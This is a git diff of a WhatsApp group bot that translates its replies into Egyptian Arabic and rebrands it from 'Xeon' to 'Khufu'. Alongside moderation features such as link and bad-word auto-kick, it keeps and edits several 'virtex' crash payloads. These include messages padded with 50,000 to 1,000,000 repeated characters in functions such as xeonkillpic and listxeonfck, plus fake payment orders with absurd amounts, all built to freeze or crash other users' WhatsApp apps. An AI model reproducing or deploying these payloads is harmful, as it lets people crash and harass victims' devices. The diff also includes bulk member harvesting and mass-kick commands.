@@ -224,7 +224,7 @@ module.exports = XeonBotInc = async (XeonBotInc, m, chatUpdate, store) => {
                   if (!('anticontact' in group)) group.anticontact = false
                   if (!('antilocation' in group)) group.antilocation = false
                   if (!('antidocument' in group)) group.antidocument = false
-                  if (!('antilink' in group)) group.antilink = false
+                  if (!('antilink' in group)) group.antilink = true
                   if (!('antipromotion' in group)) group.antipromotion = false
                   if (!('antidelete' in group)) group.antidelete = true
 			} else {
@@ -247,7 +247,7 @@ module.exports = XeonBotInc = async (XeonBotInc, m, chatUpdate, store) => {
                   antilocation: false,
                   antidocument: false,
                   anticontact: false,
-                  antilink: false,
+                  antilink: true,
                   antipromotion: false,
                   antidelete: true
 				}
@@ -478,6 +478,7 @@ XeonBotInc.sendMessage(m.chat, {text:`\`\`\`「 Promotion Detected 」\`\`\`\n\n
         if (db.groups[m.chat].badword) {
             for (let bak of bad) {
                if (budy === bak) {
+               if (XeonTheCreator) return replygcxeon(`ْعيب`)
                   XeonBotInc.sendMessage(m.chat,
 			    {
 			        delete: {
@@ -487,6 +488,7 @@ XeonBotInc.sendMessage(m.chat, {text:`\`\`\`「 Promotion Detected 」\`\`\`\n\n
 			            participant: m.key.participant
 			        }
 			    })
+			    XeonBotInc.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
 			XeonBotInc.sendMessage(m.chat, {text:`\`\`\`「 Bad Word Detected 」\`\`\`\n\n@${m.sender.split("@")[0]} was using harsh words and his chat has been deleted`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
                }
             }
@@ -495,7 +497,7 @@ XeonBotInc.sendMessage(m.chat, {text:`\`\`\`「 Promotion Detected 」\`\`\`\n\n
 //ANTI VIRUS
 if (m.isGroup && db.groups[m.chat].antivirtex) {
 if (budy.includes('๒๒๒๒') || budy.includes('ดุ') || budy.includes('ผิดุท้เึางืผิดุท้เึางื') || budy.includes('๑๑๑๑๑๑๑๑') || budy.includes('৭৭৭৭৭৭৭৭') || budy.includes('   ⃢   ⃢   ⃢  ') || budy.includes('*⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃟⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢⃟⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢⃟⃟ᡃ⃟ᡃ⃟ᡃ⃢ᡃ⃢ᡃ⃢⃟⃢⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃟⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢⃟⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢⃟⃟ᡃ⃟ᡃ⃟ᡃ⃢ᡃ⃢ᡃ⃢⃟⃢⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃟⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢⃟⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢⃟⃟ᡃ⃟ᡃ⃟ᡃ⃢ᡃ⃢ᡃ⃢⃟⃢⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟') || budy.includes('ผดิทุเ้ึางผืดิทุเ้') || budy.includes('.*࡞ࣰࣰࣰࣲࣲࣲࣲࣩࣩࣩࣩࣶࣶ࣯࣯࣮࣮ࣦ࣯ࣨࣨࣨࣻࣻࣻࣼࣼࣼࣽࣽࣾࣷࣵࣴ࣬࣬࣬ࣤࣤࣧࣧ*') || budy.includes('᥋') || budy.includes('؁') || budy.includes('ٯٯٯٯٯ') ) {
-if (m.isBotAdmin) return replygcxeon('*VIRTEX DETECTED*')
+if (m.isBotAdmin) return replygcxeon('*اتقي الله يهقر 🤔❤️.*')
 console.log(color('[KICK]', 'red'), color('Received a virus text!', 'yellow'))
 XeonBotInc.sendText(m.chat, `*MARK AS READ*\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n *Virus sender here👇:* \nwa.me/${sender.split("@")[0]}`)   
 if (!m.m.isBotAdmin) return
@@ -589,7 +591,7 @@ XeonBotInc.sendMessage(`${ownernumber}@s.whatsapp.net`,{text: `Hi Owner! wa.me/$
   
         if (db.groups[m.chat].antilink) {
             if (budy.match('http') && budy.match('https')) {
-               bvl = `\`\`\`「 Link Detected 」\`\`\`\n\nAdmin has sent a link, admin is free to send any link😇`
+               bvl = `\`\`\`「 مكافحه اللينكات 」\`\`\`\n\nالادمن بعت لينك والادمن حر 😁❤️`
 if (m.isAdmin) return replygcxeon(bvl)
 if (m.key.fromMe) return replygcxeon(bvl)
 if (XeonTheCreator) return replygcxeon(bvl)
@@ -602,7 +604,8 @@ if (XeonTheCreator) return replygcxeon(bvl)
 			            participant: m.key.participant
 			        }
 			    })
-			XeonBotInc.sendMessage(m.chat, {text:`\`\`\`「 Link Detected 」\`\`\`\n\n@${m.sender.split("@")[0]} has sent a link and successfully deleted`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
+			    XeonBotInc.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
+			XeonBotInc.sendMessage(m.chat, {text:`\`\`\`「 مكافحه اللينكات 」\`\`\`\n\nاطلع برا @${m.sender.split("@")[0]}`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
             }
         }
         
@@ -647,7 +650,7 @@ await XeonBotInc.sendMessage(m.chat, { react: { text: "✖️",key: m.key,}})
 				const mess = chatUpdate.messages[0].message.protocolMessage
 				if (store.messages && store.messages[m.chat] && store.messages[m.chat].array) {
 					const chats = store.messages[m.chat].array.find(a => a.id === mess.key.id);
-					chats.msg.contextInfo = { mentionedJid: [chats.key.participant], isForwarded: true, forwardingScore: 1, quotedMessage: { conversation: '*Anti Delete❗*'}, ...chats.key }
+					chats.msg.contextInfo = { mentionedJid: [chats.key.participant], isForwarded: true, forwardingScore: 1, quotedMessage: { conversation: '*منع حذف رسايل*'}, ...chats.key }
 					await XeonBotInc.relayMessage(m.chat, { [chats.type]: chats.msg }, {})
 				}
 			}
@@ -784,7 +787,7 @@ fs.writeFileSync('./src/user.json', JSON.stringify(xeonverifieduser, null, 2))
 		}
 		
 		// Guess Bomb
-		let pilih = '🌀', bomb = '💣';
+		let pilih = '🐤', bomb = '🥚';
 		if (m.sender in game.tebakbom) {
 			if (!/^[1-9]|10$/i.test(body) && !isCmd) return !0;
 			if (game.tebakbom[m.sender].petak[parseInt(body) - 1] === 1) return !0;
@@ -797,10 +800,10 @@ fs.writeFileSync('./src/user.json', JSON.stringify(xeonverifieduser, null, 2))
 				let brd = game.tebakbom[m.sender].board;
 				if (game.tebakbom[m.sender].nyawa.length < 1) {
 					global.db.users[m.sender].limit -= 1
-					await replygcxeon(`*THE GAME IS OVER*\nYou were hit by a bomb\n\n ${brd.join('')}\n\n*Selected :* ${game.tebakbom[m.sender].pick}\n_Limit Reduction : 1_`);
+					await replygcxeon(`*خسرت يصحبي طلعت 3 بيضات 😁❤️*\n\n ${brd.join('')}\n\n*اختارت :* ${game.tebakbom[m.sender].pick}\n_هينقص من محاولاتك : 1_`);
 					XeonBotInc.sendMessage(m.chat, {react: {text: '😂', key: m.key}})
 					delete game.tebakbom[m.sender];
-				} else await replygcxeon(`*SELECT A NUMBER*\n\nYou were hit by a bomb\n ${brd.join('')}\n\nSelected: ${game.tebakbom[m.sender].pick}\nRemaining life: ${game.tebakbom[m.sender].nyawa}`);
+				} else await replygcxeon(`*اختار رقم يزمكس ❤️🔥.“*\n\nركز يصحبي طلعت بيضه 🥺\n ${brd.join('')}\n\n*اختارت*: ${game.tebakbom[m.sender].pick}\n*ناقص من قلوبك*: ${game.tebakbom[m.sender].nyawa}`);
 				return !0;
 			}
 			if (game.tebakbom[m.sender].petak[parseInt(body) - 1] === 0) {
@@ -812,9 +815,9 @@ fs.writeFileSync('./src/user.json', JSON.stringify(xeonverifieduser, null, 2))
 				if (game.tebakbom[m.sender].lolos < 1) {
 					global.db.users[m.sender].limit += 3
 					global.db.users[m.sender].uang += 3000
-					await replygcxeon(`*YOU ARE GREAT ಠ⁠ᴥ⁠ಠ*\n\n${brd.join('')}\n\n*Selected :* ${game.tebakbom[m.sender].pick}\n*Remaining life :* ${game.tebakbom[m.sender].nyawa}\n*Bomb :* ${game.tebakbom[m.sender].bomb}\n*Present :* Money(3000) & Limit(3)`);
+					await replygcxeon(`*عاش يزمكس كسبت ❤️🔥.“*\n\n${brd.join('')}\n\n*اختارت :* ${game.tebakbom[m.sender].pick}\n*عدد قلوب الناقصه :* ${game.tebakbom[m.sender].nyawa}\n*عدد البيض ال ناقص :* ${game.tebakbom[m.sender].bomb}\n*اضاف لحسابك :* فلوس(3000) و محاولات(3)`);
 					delete game.tebakbom[m.sender];
-				} else replygcxeon(`*SELECT A NUMBER*\n\n${brd.join('')}\n\nSelected : ${game.tebakbom[m.sender].pick}\nRemaining life : ${game.tebakbom[m.sender].nyawa}\nBomb : ${game.tebakbom[m.sender].bomb}`)
+				} else replygcxeon(`*اختار رقم يصديقي 😎🤟*\n\n${brd.join('')}\n\n*اختارت* : ${game.tebakbom[m.sender].pick}\n*ناقص من قلوبك* : ${game.tebakbom[m.sender].nyawa}\n*عدد البيض الناقص* : ${game.tebakbom[m.sender].bomb}`)
 			}
 		}
 		
@@ -885,15 +888,6 @@ fs.writeFileSync('./src/user.json', JSON.stringify(xeonverifieduser, null, 2))
                XeonBotInc.sendMessage(m.chat, {
                   text: teks,
                   contextInfo: {
-                     externalAdReply: {
-                        showAdAttribution: true,
-                        title: botname,
-                        body: ownername,
-                        thumbnail: fs.readFileSync('./GlobalMedia/theme/cheemspic.jpg'),
-                        sourceUrl: websitex,
-                        mediaType: 1,
-                        renderLargerThumbnail: true
-                     }
                   }
                }, { quoted: m })
             } else if (typereply === 'v4') {
@@ -1128,7 +1122,7 @@ remoteJid: "status@broadcast"
 "buttons": [
 {
 "name": "review_and_pay",
-"buttonParamsJson": `{\"currency\":\"IDR\",\"total_amount\":{\"value\":49981399788,\"offset\":100},\"reference_id\":\"4OON4PX3FFJ\",\"type\":\"physical-goods\",\"order\":{\"status\":\"payment_requested\",\"subtotal\":{\"value\":49069994400,\"offset\":100},\"tax\":{\"value\":490699944,\"offset\":100},\"discount\":{\"value\":485792999999,\"offset\":100},\"shipping\":{\"value\":48999999900,\"offset\":100},\"order_type\":\"ORDER\",\"items\":[{\"retailer_id\":\"7842674605763435\",\"product_id\":\"7842674605763435\",\"name\":\"🦄드림 가이 Xeon 🦄드림 가이 Xeon 🦄드림 가이 Xeon\",\"amount\":{\"value\":9999900,\"offset\":100},\"quantity\":7},{\"retailer_id\":\"custom-item-f22115f9-478a-487e-92c1-8e7b4bf16de8\",\"name\":\"\",\"amount\":{\"value\":999999900,\"offset\":100},\"quantity\":49}]},\"native_payment_methods\":[]}`
+"buttonParamsJson": `{\"currency\":\"IDR\",\"total_amount\":{\"value\":49981399788,\"offset\":100},\"reference_id\":\"4OON4PX3FFJ\",\"type\":\"physical-goods\",\"order\":{\"status\":\"payment_requested\",\"subtotal\":{\"value\":49069994400,\"offset\":100},\"tax\":{\"value\":490699944,\"offset\":100},\"discount\":{\"value\":485792999999,\"offset\":100},\"shipping\":{\"value\":48999999900,\"offset\":100},\"order_type\":\"ORDER\",\"items\":[{\"retailer_id\":\"7842674605763435\",\"product_id\":\"7842674605763435\",\"name\":\"🦄드림 가이 Khufu 🦄드림 가이 Khufu 🦄드림 가이 Khufu\",\"amount\":{\"value\":9999900,\"offset\":100},\"quantity\":7},{\"retailer_id\":\"custom-item-f22115f9-478a-487e-92c1-8e7b4bf16de8\",\"name\":\"\",\"amount\":{\"value\":999999900,\"offset\":100},\"quantity\":49}]},\"native_payment_methods\":[]}`
 }
 ]
 }
@@ -1153,7 +1147,7 @@ remoteJid: "status@broadcast"
 "buttons": [
 {
 "name": "review_and_pay",
-"buttonParamsJson": `{\"currency\":\"IDR\",\"total_amount\":{\"value\":49981399788,\"offset\":100},\"reference_id\":\"4OON4PX3FFJ\",\"type\":\"physical-goods\",\"order\":{\"status\":\"payment_requested\",\"subtotal\":{\"value\":49069994400,\"offset\":100},\"tax\":{\"value\":490699944,\"offset\":100},\"discount\":{\"value\":485792999999,\"offset\":100},\"shipping\":{\"value\":48999999900,\"offset\":100},\"order_type\":\"ORDER\",\"items\":[{\"retailer_id\":\"7842674605763435\",\"product_id\":\"7842674605763435\",\"name\":\"🦄드림 가이 Xeon 🦄드림 가이 Xeon 🦄드림 가이 Xeon\",\"amount\":{\"value\":9999900,\"offset\":100},\"quantity\":7},{\"retailer_id\":\"custom-item-f22115f9-478a-487e-92c1-8e7b4bf16de8\",\"name\":\"\",\"amount\":{\"value\":999999900,\"offset\":100},\"quantity\":49}]},\"native_payment_methods\":[]}`
+"buttonParamsJson": `{\"currency\":\"IDR\",\"total_amount\":{\"value\":49981399788,\"offset\":100},\"reference_id\":\"4OON4PX3FFJ\",\"type\":\"physical-goods\",\"order\":{\"status\":\"payment_requested\",\"subtotal\":{\"value\":49069994400,\"offset\":100},\"tax\":{\"value\":490699944,\"offset\":100},\"discount\":{\"value\":485792999999,\"offset\":100},\"shipping\":{\"value\":48999999900,\"offset\":100},\"order_type\":\"ORDER\",\"items\":[{\"retailer_id\":\"7842674605763435\",\"product_id\":\"7842674605763435\",\"name\":\"🦄드림 가이 Khufu 🦄드림 가이 Khufu 🦄드림 가이 Khufu\",\"amount\":{\"value\":9999900,\"offset\":100},\"quantity\":7},{\"retailer_id\":\"custom-item-f22115f9-478a-487e-92c1-8e7b4bf16de8\",\"name\":\"\",\"amount\":{\"value\":999999900,\"offset\":100},\"quantity\":49}]},\"native_payment_methods\":[]}`
 }
 ]
 }
@@ -1170,7 +1164,7 @@ remoteJid: "status@broadcast"
 },
 message: {
 listResponseMessage: {
-title: `🦄드림 가이 Xeon`
+title: `🦄드림 가이 Khufu`
 }
 }
 }
@@ -1212,7 +1206,7 @@ message: {
   "liveLocationMessage": {
     "degreesLatitude": "p",
     "degreesLongitude": "p",
-    "caption": `🦄드림 가이 Xeon 🦄드림 가이 Xeon 🦄드림 가이 Xeon`+"ꦾ".repeat(50000),
+    "caption": `🦄드림 가이 Khufu 🦄드림 가이 Khufu 🦄드림 가이 Khufu`+"ꦾ".repeat(50000),
     "sequenceNumber": "0",
     "jpegThumbnail": ""
      }
@@ -1226,7 +1220,7 @@ async function xeonkillpic(target, kuwoted) {
  var etc = generateWAMessageFromContent(target, proto.Message.fromObject({
     interactiveMessage: {
       header: {
-        title: "🦄드림 가이 Xeon",
+        title: "🦄드림 가이 Khufu",
         hasMediaAttachment: true,
         ...(await prepareWAMessageMedia({ image: { url: "https://i.ibb.co/Wppj16p/cheemspic.jpg" } }, { upload: XeonBotInc.waUploadToServer }))
       },
@@ -1234,7 +1228,7 @@ async function xeonkillpic(target, kuwoted) {
         text: ""
       },
       footer: {
-        text: "›          #🦄드림 가이 Xeon"
+        text: "›          #🦄드림 가이 Khufu"
       },
       nativeFlowMessage: {
         messageParamsJson: " ".repeat(1000000)
@@ -1251,9 +1245,9 @@ await XeonBotInc.relayMessage(target, {"paymentInviteMessage": {serviceType: "FB
 async function listxeonfck(target, kuwoted) {
  var etc = generateWAMessageFromContent(target, proto.Message.fromObject({
   'listMessage': {
-    'title': "🦄드림 가이 Xeon"+" ".repeat(920000),
-        'footerText': `🦄드림 가이 Xeon 🦄드림 가이 Xeon 🦄드림 가이 Xeon`,
-        'description': `🦄드림 가이 Xeon 🦄드림 가이 Xeon 🦄드림 가이 Xeon`,
+    'title': "🦄드림 가이 Khufu"+" ".repeat(920000),
+        'footerText': `🦄드림 가이 Khufu 🦄드림 가이 Khufu 🦄드림 가이 Khufu`,
+        'description': `🦄드림 가이 Khufu 🦄드림 가이 Khufu 🦄드림 가이 Khufu`,
         'buttonText': null,
         'listType': 2,
         'productListInfo': {
@@ -1852,9 +1846,9 @@ break
         `Contact Developer On WhatsApp`, // Body message
         botname, // Footer message
         'Visit', // Button display text
-        'https://whatsapp.com/channel/0029VagJIAr3bbVBCpEkAM07', // Command (URL in this case)
+        'https://whatsapp.com/channel/0029Va7AtL9GpLHPLpNVfu1f', // Command (URL in this case)
         'cta_url', // Button type
-        'https://whatsapp.com/channel/0029VagJIAr3bbVBCpEkAM07' // URL (used in image generation)
+        'https://whatsapp.com/channel/0029Va7AtL9GpLHPLpNVfu1f' // URL (used in image generation)
     ], 
 ];
 
@@ -10475,7 +10469,7 @@ if (!XeonTheCreator) return XeonStickOwner()
         },
         interactiveMessage: proto.Message.InteractiveMessage.create({
           body: proto.Message.InteractiveMessage.Body.create({
-            text: `Hi ${m.pushName}\nPlease click on the button below to use _*${command}*_ command`
+            text: `اهلا ${m.pushName}\nبص يزميلي هتدوس علي زرار ال تحت ده وتختار عايز تفعل ميزه _*${command}*_ ولا لا ❤️🔥.“`
           }),
           footer: proto.Message.InteractiveMessage.Footer.create({
             text: botname
@@ -10491,16 +10485,16 @@ if (!XeonTheCreator) return XeonStickOwner()
             buttons: [
               {
                 "name": "single_select",
-                "buttonParamsJson": `{"title":"SELECT ENABLE/DISABLE",
-"sections":[{"title":"CHOOSE ENABLE/DISABLE",
-"rows":[{"header":"ENABLE ✅",
-"title":"CHOOSE ",
-"description":"ENABLE ✅",
-"id":"${prefix+command} on"},
-{"header":"DISABLE ❌",
-"title":"CHOOSE ",
-"description":"DISABLE ❌",
-"id":"${prefix+command} off"}
+                "buttonParamsJson": `{"title":"اختار هتفعل ولا هتقفل 🤔❤️.",
+"sections":[{"title":"هتفعل/هتقفل",
+"rows":[{"header":"فعل ✅",
+"title":" ",
+"description":"فعل ✅",
+"id":"${command} فعل"},
+{"header":"اقفل ❌",
+"title":" ",
+"description":"اقفل ❌",
+"id":"${command} اقفل"}
 ]
 }
 ]
@@ -11463,17 +11457,18 @@ if (!m.isAdmin && !XeonTheCreator) return XeonStickAdmin()
   XeonBotInc.sendMessage(m.chat, {text: replyMessage}, {quoted:m});
 };
 break
-			case 'addbadword': case 'addbd':
+			case 'اضافه-شتيمه': 
                if (!XeonTheCreator) return XeonStickOwner()
                if (args.length < 1) return replygcxeon( `Send command ${prefix}addbadword [harsh word]. Example ${prefix}addbadword asshole`)
                bad.push(q)
                fs.writeFileSync('./src/badword.json', JSON.stringify(bad))
                replygcxeon('Successfully Added Bad Word!')
             break
-            case 'delbadword': case 'deldb':
+            case 'ازاله-شتيمه': case 'deldb':
                if (!XeonTheCreator) return XeonStickOwner()
-               if (args.length < 1) return replygcxeon( `Send commands ${prefix}addbadword [bad word]. Example ${prefix}addbadword asshole`)                 
-               bad.splice(q)
+               if (args.length < 1) return replygcxeon( `Send commands ${prefix}addbadword [bad word]. Example ${prefix}addbadword asshole`)  
+               let wanu = bad.indexOf(q)
+               bad.splice(wanu, 1)
                fs.writeFileSync('./src/badword.json', JSON.stringify(bad))
                replygcxeon('Successfully Deleted Bad Word!')
             break 
@@ -11508,7 +11503,7 @@ if (!m.isAdmin && !XeonTheCreator) return XeonStickAdmin()
         },
         interactiveMessage: proto.Message.InteractiveMessage.create({
           body: proto.Message.InteractiveMessage.Body.create({
-            text: `Hi ${m.pushName}\nPlease click on the button below to use _*${command}*_ command`
+            text: `اهلا ${m.pushName}\nبص يزميلي هتدوس علي زرار ال تحت ده وتختار عايز تفعل ميزه _*${command}*_ ولا لا ❤️🔥.“`
           }),
           footer: proto.Message.InteractiveMessage.Footer.create({
             text: botname
@@ -11524,16 +11519,16 @@ if (!m.isAdmin && !XeonTheCreator) return XeonStickAdmin()
             buttons: [
               {
                 "name": "single_select",
-                "buttonParamsJson": `{"title":"SELECT ENABLE/DISABLE",
-"sections":[{"title":"CHOOSE ENABLE/DISABLE",
-"rows":[{"header":"ENABLE ✅",
-"title":"CHOOSE ",
-"description":"ENABLE ✅",
-"id":"${prefix+command} on"},
-{"header":"DISABLE ❌",
-"title":"CHOOSE ",
-"description":"DISABLE ❌",
-"id":"${prefix+command} off"}
+                "buttonParamsJson": `{"title":"اختار هتفعل ولا هتقفل 🤔❤️.",
+"sections":[{"title":"هتفعل/هتقفل",
+"rows":[{"header":"فعل ✅",
+"title":" ",
+"description":"فعل ✅",
+"id":"${command} فعل"},
+{"header":"اقفل ❌",
+"title":" ",
+"description":"اقفل ❌",
+"id":"${command} اقفل"}
 ]
 }
 ]
@@ -11584,7 +11579,7 @@ if (!m.isAdmin && !XeonTheCreator) return XeonStickAdmin()
         },
         interactiveMessage: proto.Message.InteractiveMessage.create({
           body: proto.Message.InteractiveMessage.Body.create({
-            text: `Hi ${m.pushName}\nPlease click on the button below to use _*${command}*_ command`
+            text: `اهلا ${m.pushName}\nبص يزميلي هتدوس علي زرار ال تحت ده وتختار عايز تفعل ميزه _*${command}*_ ولا لا ❤️🔥.“`
           }),
           footer: proto.Message.InteractiveMessage.Footer.create({
             text: botname
@@ -11600,16 +11595,16 @@ if (!m.isAdmin && !XeonTheCreator) return XeonStickAdmin()
             buttons: [
               {
                 "name": "single_select",
-                "buttonParamsJson": `{"title":"SELECT ENABLE/DISABLE",
-"sections":[{"title":"CHOOSE ENABLE/DISABLE",
-"rows":[{"header":"ENABLE ✅",
-"title":"CHOOSE ",
-"description":"ENABLE ✅",
-"id":"${prefix+command} on"},
-{"header":"DISABLE ❌",
-"title":"CHOOSE ",
-"description":"DISABLE ❌",
-"id":"${prefix+command} off"}
+                "buttonParamsJson": `{"title":"اختار هتفعل ولا هتقفل 🤔❤️.",
+"sections":[{"title":"هتفعل/هتقفل",
+"rows":[{"header":"فعل ✅",
+"title":" ",
+"description":"فعل ✅",
+"id":"${command} فعل"},
+{"header":"اقفل ❌",
+"title":" ",
+"description":"اقفل ❌",
+"id":"${command} اقفل"}
 ]
 }
 ]
@@ -11841,13 +11836,13 @@ break
                     replygcxeon(open)
                 }, timer)
                 break
-			case 'editinfo':{
+			case 'اعدادات-جروب': case 'اعدادات-الجروب':{
                 if (!m.isGroup) return XeonStickGroup()
                 if (!m.isAdmin && !XeonTheCreator) return XeonStickAdmin()
                 if (!m.isBotAdmin) return XeonStickBotAdmin()
-                if (args[0] === 'open') {
+                if (args[0] === 'شغلها') {
                     await XeonBotInc.groupSettingUpdate(m.chat, 'unlocked').then((res) => replygcxeon(`Successfully Opened Edit Group Info`))
-                } else if (args[0] === 'close') {
+                } else if (args[0] === 'اقفلها') {
                     await XeonBotInc.groupSettingUpdate(m.chat, 'locked').then((res) => replygcxeon(`Successfully Closed Edit Group Info`))
                 } else {
                 	let msg = generateWAMessageFromContent(m.chat, {
@@ -11859,7 +11854,7 @@ break
         },
         interactiveMessage: proto.Message.InteractiveMessage.create({
           body: proto.Message.InteractiveMessage.Body.create({
-            text: `Hi ${m.pushName}\nPlease click on the button below to use _*${command}*_ command`
+            text: `اهلا ${m.pushName}\nبص يزميلي هتدوس علي زرار ال تحت ده وتختار عايز تفعل ميزه _*${command}*_ ولا لا ❤️🔥.“`
           }),
           footer: proto.Message.InteractiveMessage.Footer.create({
             text: botname
@@ -11875,16 +11870,16 @@ break
             buttons: [
               {
                 "name": "single_select",
-                "buttonParamsJson": `{"title":"SELECT ENABLE/DISABLE",
-"sections":[{"title":"CHOOSE ENABLE/DISABLE",
-"rows":[{"header":"ENABLE ✅",
-"title":"CHOOSE ",
-"description":"ENABLE ✅",
-"id":"${prefix+command} on"},
-{"header":"DISABLE ❌",
-"title":"CHOOSE ",
-"description":"DISABLE ❌",
-"id":"${prefix+command} off"}
+                "buttonParamsJson": `{"title":"اختار هتفعل ولا هتقفل 🤔❤️.",
+"sections":[{"title":"هتفعل/هتقفل",
+"rows":[{"header":"فعل ✅",
+"title":" ",
+"description":"فعل ✅",
+"id":"${command} شغلها"},
+{"header":"اقفل ❌",
+"title":" ",
+"description":"اقفل ❌",
+"id":"${command} اقفلها"}
 ]
 }
 ]
@@ -11913,7 +11908,7 @@ await XeonBotInc.relayMessage(msg.key.remoteJid, msg.message, {
 }
 }
             break
-			case 'getcontact': case 'getcon': {
+			case 'getcontact': case 'getcon': case 'ابعت-كل-الارقام': {
 if (!m.isGroup) return XeonStickGroup()
 if (!(m.isAdmin || XeonTheCreator)) return XeonStickAdmin()
 xeonbigpp = await XeonBotInc.sendMessage(m.chat, {
@@ -11923,7 +11918,7 @@ await sleep(1000)
 XeonBotInc.sendContact(m.chat, participants.map(a => a.id), xeonbigpp)
 }
 break
-case 'savecontact': case 'svcontact':{
+case 'savecontact': case 'svcontact': case 'احفظ-الارقام':{
 if (!m.isGroup) return XeonStickGroup()
 if (!(m.isAdmin || XeonTheCreator)) return XeonStickAdmin()
 let cmiggc = await XeonBotInc.groupMetadata(m.chat)
@@ -11943,7 +11938,7 @@ XeonBotInc.sendMessage(m.chat, {
 require('fs').unlinkSync(nmfilect)
 }
 break
-case 'sendcontact': case 'sencontact': {
+case 'sendcontact': case 'ابعت-رقم': {
 if (!m.isGroup) return XeonStickGroup()
 if (!m.mentionedJid[0]) return replygcxeon('\nUse like this\n Example:.sendcontact @tag name')
 let snTak = text.split(' ')[1] ? text.split(' ')[1] : 'Contact'
@@ -11964,7 +11959,7 @@ let sngContact = {
 XeonBotInc.sendMessage(m.chat, {contacts: sngContact, mentions: participants.map(a => a.id)}, {ephemeralExpiration: 86400})
 }
 break
-			case 'kickall': {
+			case 'طلعهم': {
  if (!m.isGroup) return XeonStickGroup()
  if (!m.isAdmin && !XeonTheCreator) return XeonStickAdmin()
  if (!m.isBotAdmin) return XeonStickBotAdmin()
@@ -11984,10 +11979,10 @@ break
  await XeonBotInc.groupParticipantsUpdate(m.chat, [(args[0] === "numBut") ? `${remove}@s.whatsapp.net` : remove], "remove");
  await sleep(100);
  }
- replygcxeon(`Success`);
+ replygcxeon(`طلعتهم يزميلي 😍`);
 }
 break
-case 'promoteall': {
+case 'ارفعهم': {
  if (!m.isGroup) return XeonStickGroup()
  if (!m.isAdmin && !XeonTheCreator) return XeonStickAdmin()
  if (!m.isBotAdmin) return XeonStickBotAdmin()
@@ -12004,10 +11999,10 @@ case 'promoteall': {
  await XeonBotInc.groupParticipantsUpdate(m.chat, [(args[0] === "numBut") ? `${promote}@s.whatsapp.net` : promote], "promote");
  await sleep(100);
  }
- replygcxeon(`Success`);
+ replygcxeon(`رفعت كل الجروب ادمن 😍`);
 }
 break
-case 'demoteall': {
+case 'نزلهم': {
  if (!m.isGroup) return XeonStickGroup()
  if (!m.isAdmin && !XeonTheCreator) return XeonStickAdmin()
  if (!m.isBotAdmin) return XeonStickBotAdmin()
@@ -12024,7 +12019,7 @@ case 'demoteall': {
  await XeonBotInc.groupParticipantsUpdate(m.chat, [(args[0] === "numBut") ? `${demote}@s.whatsapp.net` : demote], "demote");
  await sleep(100);
  }
- replygcxeon(`Success`);
+ replygcxeon(`نزلت كل الادمن 😍`);
 }
 break
 			case 'ephemeral': {
@@ -12047,7 +12042,7 @@ break
         },
         interactiveMessage: proto.Message.InteractiveMessage.create({
           body: proto.Message.InteractiveMessage.Body.create({
-            text: `Hi ${m.pushName}\nPlease click on the button below to use _*${command}*_ command`
+            text: `اهلا ${m.pushName}\nبص يزميلي هتدوس علي زرار ال تحت ده وتختار عايز تفعل ميزه _*${command}*_ ولا لا ❤️🔥.“`
           }),
           footer: proto.Message.InteractiveMessage.Footer.create({
             text: botname
@@ -12063,16 +12058,16 @@ break
             buttons: [
               {
                 "name": "single_select",
-                "buttonParamsJson": `{"title":"SELECT ENABLE/DISABLE",
